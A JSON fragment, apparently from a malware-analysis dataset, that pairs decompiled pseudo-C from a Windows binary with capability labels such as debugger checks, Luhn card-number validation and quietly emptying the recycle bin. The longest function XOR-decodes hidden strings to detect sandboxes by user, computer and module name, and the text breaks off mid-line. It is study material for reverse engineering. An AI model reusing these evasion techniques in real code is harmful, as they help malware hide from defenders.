        "decompiled_code": "\nuint fcn.004062f3(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    if (*0x41ccd8 == 6) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return TokenInformation;\n}\n",
        "token_count": 176
    },
    "0040bb4e": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0040bb4e(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_4h;\n    \n    do {\n        iVar1 = fcn.0040b3cf(arg_8h, arg_ch, arg_10h, arg_14h, *in_EDX);\n        if (iVar1 != 6) break;\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.00407fc3();\n    }\n    return iVar1;\n}\n",
        "token_count": 184
    },
    "00407cb6": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.00407cb6(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    uVar2 = 0;\n    if (arg_ch != 4) {\n        do {\n            iVar3 = 4;\n            pcVar1 = \"DDDD\\x01\";\n            do {\n                iVar3 = iVar3 + -1;\n                if (pcVar1[arg_8h + -0x41ca8c + uVar2] != *pcVar1) {\n                    iVar3 = pcVar1[arg_8h + -0x41ca8c + uVar2] - *pcVar1;\n                    break;\n                }\n                pcVar1 = pcVar1 + 1;\n            } while (iVar3 != 0);\n            if (iVar3 == 0) {\n                return uVar2 + arg_8h;\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch - 4U);\n    }\n    return 0;\n}\n",
        "token_count": 271
    },
    "0040e4a3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040e4a3(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n    }\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 153
    },
    "00408653": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00408653(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwSize;\n    \n    iVar2 = fcn.004088d2(&var_24h, &dwSize);\n    var_28h = 0;\n    if ((iVar2 == 0) &&\n       (arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4),  iVar2 = var_20h,  iVar4 = dwSize, \n       uVar5 = var_24h,  var_10h = arg_8h_00,  arg_8h_00 != 0)) {\n        do {\n            var_1ch = uVar5;\n            var_18h = iVar2;\n            dwSize = arg_8h_00;\n            fcn.00408722(arg_8h_00, 0x1000);\n            iVar1 = var_10h;\n            arg_8h_00 = dwSize + 0x1000;\n            var_1ch = uVar5 + 0x1000;\n            var_18h = iVar2 + (0xffffefff < uVar5);\n            iVar4 = iVar4 + -0x1000;\n            iVar2 = var_18h;\n            uVar5 = var_1ch;\n        } while (iVar4 != 0);\n        dwSize = arg_8h_00;\n        puVar3 = fcn.0040d5aa(0x1000);\n        if (puVar3 == NULL) {\n            var_2ch = 0;\n        }\n        else {\n            var_2ch = *puVar3 + var_24h;\n            var_28h = var_20h + CARRY4(*puVar3, var_24h);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    }\n    else {\n        var_2ch = 0;\n    }\n    return CONCAT44(var_28h, var_2ch);\n}\n",
        "token_count": 577
    },
    "00409ae2": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00409ae2(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    uint32_t uVar19;\n    int32_t iVar20;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint pcbBuffer;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    uint32_t var_58h;\n    uint32_t var_54h;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar5 = fcn.004098f3();\n    if (iVar5 != 0) {\n        fcn.0040a800();\n    }\n    var_58h._0_2_ = 0x2e;\n    var_58h._2_1_ = 0x26;\n    stack0xffffffa7 = 0x3a225c0b;\n    stack0xffffffab = 0x550f254c;\n    var_50h._3_1_ = 0x4e;\n    var_8h = 0x6341624a;\n    var_4h = CONCAT22(var_4h._2_2_, 0x4e39);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    var_48h = 6;\n    iVar20 = 0;\n    var_6ch = &var_58h - iVar5;\n    do {\n        puVar1 = iVar20 + iVar5;\n        iVar7 = iVar20 % 6;\n        iVar20 = iVar20 + 1;\n        *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_58h - iVar5];\n    } while (iVar20 < 0xc);\n    iVar20 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar20 != 0) {\n        fcn.0040a800();\n    }\n    var_58h._0_2_ = 0x33a;\n    var_4ch = 5;\n    var_58h._2_1_ = 5;\n    stack0xffffffa7 = 0x250e5515;\n    stack0xffffffab = 0x5d1c084f;\n    var_50h._3_1_ = 0x62;\n    var_8h = 0x706c6149;\n    var_4h = CONCAT22(var_4h._2_2_, 0x6231);\n    uVar6 = (*pcVar3)(8, 0xd);\n    iVar20 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar7 = 0;\n    var_6ch = &var_58h - iVar20;\n    do {\n        puVar1 = iVar7 + iVar20;\n        iVar8 = iVar7 % var_48h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_8h + iVar8) ^ puVar1[&var_58h - iVar20];\n    } while (iVar7 < 0xc);\n    iVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar20);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar7 != 0) {\n        fcn.0040a800();\n    }\n    pcbBuffer = 0x400;\n    iVar7 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x41cdd8, &pcbBuffer);\n    if (iVar7 == 0) {\n        fcn.0040a800();\n    }\n    var_ch = 0x2702023b;\n    var_8h = 0x2503162a;\n    var_4h = 0x770a2a26;\n    var_88h = 0x55707778;\n    var_84h._0_1_ = 0x4f;\n    uVar6 = (*pcVar3)(8, 0xd);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar8 = 0;\n    var_6ch = &var_ch - iVar7;\n    do {\n        puVar1 = iVar8 + iVar7;\n        iVar9 = iVar8 % var_4ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_88h + iVar9) ^ puVar1[&var_ch - iVar7];\n    } while (iVar8 < 0xc);\n    iVar8 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdd8, iVar7);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar8 == 0) {\n        fcn.0040a800();\n    }\n    var_8h = 0x32345160;\n    var_4h = 0x5a485c24;\n    var_68h = 0x565a3033;\n    var_64h._0_1_ = 0x46;\n    uVar6 = (*pcVar3)(8, 9);\n    var_88h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar8 = 0;\n    var_6ch = &var_8h - var_88h;\n    do {\n        puVar1 = iVar8 + var_88h;\n        iVar9 = iVar8 % var_4ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_68h + iVar9) ^ puVar1[&var_8h - var_88h];\n    } while (iVar8 < 8);\n    iVar8 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdd8, var_88h);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar8 == 0) {\n        fcn.0040a800();\n    }\n    pcbBuffer = 0x400;\n    var_28h._0_2_ = 0x532e;\n    var_28h._2_1_ = 0x15;\n    var_28h._3_1_ = 100;\n    var_24h._0_2_ = 0x503e;\n    var_24h._2_1_ = 0x23;\n    var_24h._3_1_ = 0x53;\n    var_20h._0_2_ = 0x6413;\n    var_20h._2_1_ = 0x39;\n    stack0xffffffdf = 0xb533850;\n    var_1ch._3_1_ = 100;\n    var_18h._0_2_ = 0x5050;\n    var_8h = 0x64645356;\n    var_4h = CONCAT22(var_4h._2_2_, 0x5050);\n    uVar6 = (*pcVar3)(8, 0x25);\n    var_6ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar9 = 0;\n    iVar8 = var_6ch;\n    do {\n        puVar1 = iVar9 + iVar8;\n        iVar8 = iVar9 % var_48h;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_8h + iVar8) ^ puVar1[&var_28h - var_6ch];\n        iVar8 = var_6ch;\n    } while (iVar9 < 0x12);\n    iVar8 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x41cdd8, &pcbBuffer);\n    if (iVar8 == 0) {\n        fcn.0040a800();\n    }\n    var_28h._0_2_ = 0x336b;\n    var_28h._2_1_ = 0x57;\n    var_28h._3_1_ = 0x6b;\n    var_24h._0_2_ = 0x4931;\n    var_24h._2_1_ = 0x11;\n    var_24h._3_1_ = 0x72;\n    var_20h._0_2_ = 0x4247;\n    var_20h._2_1_ = 0x69;\n    stack0xffffffdf = 0x316b5733;\n    var_1ch._3_1_ = 0x49;\n    var_18h._0_2_ = 0x7233;\n    var_68h = 0x6b723349;\n    var_64h._0_1_ = 0x42;\n    uVar6 = (*pcVar3)(8, 0x25);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar9 = 0;\n    do {\n        puVar1 = iVar9 + iVar8;\n        iVar10 = iVar9 % var_4ch;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_68h + iVar10) ^ puVar1[&var_28h - iVar8];\n    } while (iVar9 < 0x12);\n    stack0xffffffa7 = stack0xffffffa7 & 0xff | 0x2d023800;\n    stack0xffffffab = 0x333c1b72;\n    var_50h._3_1_ = 0x43;\n    var_8h = 0x3663436b;\n    var_4h = CONCAT22(var_4h._2_2_, 0x7359);\n    uVar6 = (*pcVar3)(8, 9);\n    var_68h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar9 = 0;\n    var_70h = &var_54h - var_68h;\n    do {\n        puVar1 = iVar9 + var_68h;\n        iVar10 = iVar9 % var_48h;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_8h + iVar10) ^ puVar1[&var_54h - var_68h];\n    } while (iVar9 < 8);\n    iVar9 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdd8, var_68h);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar9 == 0) {\n        fcn.0040a800();\n    }\n    var_8h = 0x61c615f;\n    var_4h = 0x5573211f;\n    var_14h = 0x4a553268;\n    var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x49);\n    uVar6 = (*pcVar3)(8, 9);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar10 = 0;\n    stack0xffffffab = stack0xffffffab & 0xff | iVar9 << 8;\n    var_50h._3_1_ = iVar9 >> 0x18;\n    var_70h = &var_8h - iVar9;\n    do {\n        puVar1 = iVar10 + iVar9;\n        iVar11 = iVar10 % var_4ch;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_14h + iVar11) ^ puVar1[&var_8h - iVar9];\n    } while (iVar10 < 8);\n    iVar9 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdd8, iVar9);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar9 == 0) {\n        fcn.0040a800();\n    }\n    var_34h._0_1_ = 0x26;\n    var_34h._1_1_ = 0x11;\n    var_34h._2_2_ = 0x113e;\n    var_30h._0_2_ = 0x2f1b;\n    var_30h._2_2_ = 0x2902;\n    var_2ch._0_2_ = 0x809;\n    var_2ch._2_1_ = 0x2b;\n    var_2ch._3_1_ = 3;\n    var_28h._0_2_ = 0x72f;\n    var_28h._2_1_ = 5;\n    var_28h._3_1_ = 0x3e;\n    var_24h._0_2_ = 0x2504;\n    var_24h._2_1_ = 0x1a;\n    var_24h._3_1_ = 2;\n    var_20h._0_2_ = 0x332;\n    var_20h._2_1_ = 0x15;\n    stack0xffffffdf = 0x3d0b3826;\n    var_1ch._3_1_ = 0x6c;\n    var_14h = 0x556c506e;\n    var_10h._0_1_ = 0x4c;\n    uVar6 = (*pcVar3)(8, 0x1d);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar10 = 0;\n    var_70h = &var_34h - iVar9;\n    do {\n        puVar1 = iVar10 + iVar9;\n        iVar11 = iVar10 % var_4ch;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_14h + iVar11) ^ puVar1[&var_34h - iVar9];\n    } while (iVar10 < 0x1c);\n    var_28h._0_2_ = 0x1222;\n    var_28h._2_1_ = 0x1d;\n    var_28h._3_1_ = 0x39;\n    var_24h._0_2_ = 0x1c0d;\n    var_24h._2_1_ = 0x29;\n    var_24h._3_1_ = 7;\n    var_20h._0_2_ = 0x1b22;\n    var_20h._2_1_ = 0x27;\n    stack0xffffffdf = 0x13e1c0e;\n    var_1ch._3_1_ = 0x1e;\n    var_18h._0_2_ = 0x6e05;\n    var_14h = 0x4d6e6b71;\n    var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x68);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    var_70h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar10 = 0;\n    var_90h = &var_28h - var_70h;\n    do {\n        puVar1 = iVar10 + var_70h;\n        iVar11 = iVar10 % var_4ch;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_14h + iVar11) ^ puVar1[var_90h];\n    } while (iVar10 < 0x12);\n    cVar4 = fcn.0040a7a4(var_70h, var_70h);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar4 == '\\0') {\n        fcn.0040a800();\n    }\n    var_14h = 0x4c0f0a70;\n    var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x79);\n    var_8h = 0x6c464731;\n    var_4h._0_2_ = 0x4279;\n    uVar6 = (*pcVar3)(8, 6);\n    iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar11 = 0;\n    do {\n        puVar1 = iVar11 + iVar10;\n        iVar12 = iVar11 % var_48h;\n        iVar11 = iVar11 + 1;\n        *puVar1 = *(&var_8h + iVar12) ^ puVar1[&var_14h - iVar10];\n    } while (iVar11 < 5);\n    var_8h = 0xb163a34;\n    var_4h._0_2_ = 0x751b;\n    var_14h = 0x43557576;\n    var_10h._0_2_ = 0x7548;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 7);\n    iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar12 = 0;\n    do {\n        puVar1 = iVar12 + iVar11;\n        iVar13 = iVar12 % 6;\n        iVar12 = iVar12 + 1;\n        *puVar1 = *(&var_14h + iVar13) ^ puVar1[&var_8h - iVar11];\n    } while (iVar12 < 6);\n    var_14h = 0x3b180c30;\n    var_10h._0_1_ = 0x6f;\n    var_60h = 0x63574e66;\n    var_5ch._0_1_ = 0x6f;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar13 = 0;\n    do {\n        puVar1 = iVar13 + iVar12;\n        iVar14 = iVar13 % 5;\n        iVar13 = iVar13 + 1;\n        *puVar1 = *(&var_60h + iVar14) ^ puVar1[&var_14h - iVar12];\n    } while (iVar13 < 5);\n    var_14h = 0xd3b101c;\n    var_10h._0_1_ = 0x47;\n    var_8h = 0x5876554d;\n    var_4h._0_2_ = 0x7347;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar14 = 0;\n    do {\n        puVar1 = iVar14 + iVar13;\n        iVar15 = iVar14 % var_48h;\n        iVar14 = iVar14 + 1;\n        *puVar1 = *(&var_8h + iVar15) ^ puVar1[&var_14h - iVar13];\n    } while (iVar14 < 5);\n    var_14h = 0x8710934;\n    var_10h._0_1_ = 0x48;\n    var_8h = 0x41324467;\n    var_4h._0_2_ = 0x7a48;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar15 = 0;\n    do {\n        puVar1 = iVar15 + iVar14;\n        iVar16 = iVar15 % var_48h;\n        iVar15 = iVar15 + 1;\n        *puVar1 = *(&var_8h + iVar16) ^ puVar1[&var_14h - iVar14];\n    } while (iVar15 < 5);\n    var_28h._0_2_ = 0x3e01;\n    var_28h._2_1_ = 0x1b;\n    var_28h._3_1_ = 0x22;\n    var_24h._0_2_ = 0x4415;\n    var_24h._2_1_ = 0x68;\n    var_24h._3_1_ = 0x5d;\n    var_20h._0_2_ = 0x516f;\n    var_20h._2_1_ = 0x69;\n    stack0xffffffdf = 0x7f407850;\n    var_1ch._3_1_ = 0x57;\n    var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x59);\n    var_8h = 0x674f7048;\n    var_4h._0_2_ = 0x6459;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    var_90h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar15 = 0;\n    var_8ch = &var_28h - var_90h;\n    do {\n        puVar1 = iVar15 + var_90h;\n        iVar16 = iVar15 % var_48h;\n        iVar15 = iVar15 + 1;\n        *puVar1 = *(&var_8h + iVar16) ^ puVar1[var_8ch];\n    } while (iVar15 < 0x11);\n    var_8h = 0xe1d3f2a;\n    var_4h = CONCAT13(var_4h._3_1_, 0x6b5d4a);\n    var_14h = 0x5a536b6c;\n    var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x67);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 8);\n    var_8ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar15 = 0;\n    var_44h = &var_8h - var_8ch;\n    do {\n        puVar1 = iVar15 + var_8ch;\n        iVar16 = iVar15 % var_4ch;\n        iVar15 = iVar15 + 1;\n        *puVar1 = *(&var_14h + iVar16) ^ puVar1[&var_8h - var_8ch];\n    } while (iVar15 < 7);\n    var_60h = 0xd370123;\n    var_5ch._0_1_ = 0x71;\n    var_8h = 0x44794e70;\n    var_4h = CONCAT22(var_4h._2_2_, 0x5571);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    *0x41d220 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    var_14h = *0x41d220;\n    iVar15 = 0;\n    var_44h = &var_60h - *0x41d220;\n    do {\n        puVar1 = iVar15 + *0x41d220;\n        iVar16 = iVar15 % var_48h;\n        iVar15 = iVar15 + 1;\n        *puVar1 = *(&var_8h + iVar16) ^ puVar1[&var_60h - *0x41d220];\n    } while (iVar15 < 5);\n    *0x41d21c = var_8ch;\n    uVar19 = 0;\n    *0x41d218 = var_90h;\n    *0x41d200 = iVar10;\n    *0x41d208 = iVar11;\n    *0x41d20c = iVar12;\n    *0x41d210 = iVar13;\n    *0x41d214 = iVar14;\n    do {\n        iVar15 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdd8, *(uVar19 + 0x41d200));\n        if (iVar15 != 0) {\n            fcn.0040a800();\n        }\n        uVar19 = uVar19 + 4;\n    } while (uVar19 < 0x20);\n    var_28h._0_2_ = 0xb1f;\n    var_28h._2_1_ = 0x14;\n    var_28h._3_1_ = 0x51;\n    var_24h._0_2_ = 0x302c;\n    var_24h._2_1_ = 0x20;\n    var_24h._3_1_ = 0xd;\n    var_20h._0_2_ = 0x6203;\n    var_20h._2_1_ = 0x26;\n    stack0xffffffdf = 0x1f0b3a00;\n    var_1ch._3_1_ = 0x5a;\n    var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x43);\n    var_8h = 0x34706249;\n    var_4h = CONCAT22(var_4h._2_2_, 0x7243);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    var_60h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar15 = 0;\n    var_44h = &var_28h - var_60h;\n    do {\n        puVar1 = iVar15 + var_60h;\n        iVar16 = iVar15 % var_48h;\n        iVar15 = iVar15 + 1;\n        *puVar1 = *(&var_8h + iVar16) ^ puVar1[&var_28h - var_60h];\n    } while (iVar15 < 0x11);\n    cVar4 = fcn.0040a7a4(var_60h, var_60h);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar4 == '\\0') {\n        fcn.0040a800();\n    }\n    var_ch = 0x193d2b18;\n    var_8h = 0xd2e2f30;\n    var_4h = var_4h & 0xff000000 | 0x4e3d02;\n    var_80h = 0x6d4f424e;\n    var_7ch._0_1_ = 0x45;\n    uVar6 = (*pcVar3)(8, 0xc);\n    iVar15 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar16 = 0;\n    var_44h = &var_ch - iVar15;\n    do {\n        puVar1 = iVar16 + iVar15;\n        iVar17 = iVar16 % var_4ch;\n        iVar16 = iVar16 + 1;\n        *puVar1 = *(&var_80h + iVar17) ^ puVar1[&var_ch - iVar15];\n    } while (iVar16 < 0xb);\n    iVar16 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdd8, iVar15);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar16 != 0) {\n        fcn.0040a800();\n    }\n    var_40h = 0x3e132023;\n    var_3ch = 0x103d3160;\n    var_38h = 0xc197a36;\n    var_34h._0_1_ = 0x27;\n    var_34h._1_1_ = 5;\n    var_34h._2_2_ = 0x1f44;\n    var_30h._0_2_ = 0x2109;\n    var_30h._2_2_ = 0x6036;\n    var_2ch._0_2_ = 0x119;\n    var_2ch._2_1_ = 0x31;\n    var_28h._0_2_ = 0x340;\n    var_28h._2_1_ = 0x33;\n    var_28h._3_1_ = 0x16;\n    var_24h._0_2_ = 0x451f;\n    var_24h._2_1_ = 2;\n    var_24h._3_1_ = 10;\n    var_20h._0_2_ = 0x1e3b;\n    var_20h._2_1_ = 0x61;\n    stack0xffffffdf = 0x3261d15;\n    var_1ch._3_1_ = 0x58;\n    var_18h._0_2_ = 0x6f1e;\n    var_78h = 0x6a556f70;\n    var_74h._0_1_ = 0x37;\n    var_2ch._3_1_ = var_34h._1_1_;\n    uVar6 = (*pcVar3)(8, 0x2b);\n    var_80h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar16 = 0;\n    var_44h = &var_40h - var_80h;\n    do {\n        puVar1 = iVar16 + var_80h;\n        iVar17 = iVar16 % var_4ch;\n        iVar16 = iVar16 + 1;\n        *puVar1 = *(&var_78h + iVar17) ^ puVar1[&var_40h - var_80h];\n    } while (iVar16 < 0x2a);\n    cVar4 = fcn.0040a7a4(var_80h, var_80h);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar4 == '\\0') {\n        fcn.0040a800();\n    }\n    var_24h._2_1_ = 5;\n    var_30h._0_2_ = 0x4104;\n    var_30h._2_2_ = 0x6f57;\n    var_2ch._0_2_ = 0x1c01;\n    var_2ch._2_1_ = 0x42;\n    var_2ch._3_1_ = 0x51;\n    var_28h._0_2_ = 0x1868;\n    var_28h._2_1_ = 3;\n    var_28h._3_1_ = 0x42;\n    var_24h._0_2_ = 0x6b52;\n    var_24h._3_1_ = 7;\n    var_20h._0_2_ = 0x4840;\n    var_20h._2_1_ = 0x6a;\n    stack0xffffffdf = 0x55410806;\n    var_1ch._3_1_ = 0x58;\n    var_8h = 0x58657431;\n    var_4h = CONCAT31(var_4h._1_3_, 0x35);\n    uVar6 = (*pcVar3)(8, 0x19);\n    var_78h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar16 = 0;\n    var_44h = &var_30h - var_78h;\n    do {\n        puVar1 = iVar16 + var_78h;\n        iVar17 = iVar16 % var_4ch;\n        iVar16 = iVar16 + 1;\n        *puVar1 = *(&var_8h + iVar17) ^ puVar1[&var_30h - var_78h];\n    } while (iVar16 < 0x18);\n    iVar16 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdd8, var_78h);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar16 != 0) {\n        fcn.0040a800();\n    }\n    var_30h._0_2_ = 0x5504;\n    var_30h._2_2_ = 0x7e50;\n    var_2ch._0_2_ = 0x4972;\n    var_2ch._2_1_ = 5;\n    var_2ch._3_1_ = 0x57;\n    var_28h._0_2_ = 0x6b50;\n    var_28h._2_1_ = 0x76;\n    var_28h._3_1_ = 0x55;\n    var_24h._0_2_ = 0x5404;\n    var_24h._2_1_ = 0x54;\n    var_24h._3_1_ = 0x75;\n    var_20h._0_2_ = 0x4972;\n    var_20h._2_1_ = 1;\n    stack0xffffffdf = 0x75775150;\n    var_1ch._3_1_ = 100;\n    var_8h = 0x46646333;\n    var_4h = CONCAT22(var_4h._2_2_, 0x6445);\n    uVar6 = (*pcVar3)(8, 0x19);\n    var_4ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n    iVar16 = 0;\n    var_44h = &var_30h - var_4ch;\n    do {\n        puVar1 = iVar16 + var_4ch;\n        iVar17 = iVar16 % var_48h;\n        iVar16 = iVar16 + 1;\n        *puVar1 = *(&var_8h + iVar17) ^ puVar1[&var_30h - var_4ch];\n    } while (iVar16 < 0x18);\n    iVar16 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdd8, var_4ch);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar16 != 0) {\n        fcn.0040a800();\n    }\n    var_30h._0_2_ = 0x156;\n    var_30h._2_2_ = 0x6061;\n    var_2ch._0_2_ = 0x7c64;\n    var_2ch._2_1_ = 0x52;\n    var_2ch._3_1_ = 4;\n    var_28h._0_2_ = 0x7562;\n    var_28h._2_1_ = 0x6b;\n    var_28h._3_1_ = 0x65;\n    var_24h._0_2_ = 0xe53;\n    var_24h._2_1_ 